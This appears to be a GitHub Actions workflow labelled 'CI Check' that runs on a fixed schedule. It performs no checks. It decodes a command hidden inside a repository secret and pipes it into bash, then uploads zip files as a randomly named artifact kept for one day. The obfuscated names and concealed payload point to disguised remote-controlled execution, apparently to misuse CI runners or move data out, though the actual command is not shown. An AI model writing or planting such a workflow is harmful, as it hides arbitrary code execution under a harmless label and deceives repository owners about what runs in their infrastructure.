name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '7 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Begin
        env:
          ae2: ${{ secrets.ae2 }}
        run: |
          printf '%s' "$ae2" | jq -r .c251 | /bin/bash
          echo $lnj92 | jq -r .kpa72153 | /bin/bash

      - name: Save results
        uses: actions/upload-artifact@v4
        with:
          name: ZfhXNj4k
          path: "*.zip"
          retention-days: 1
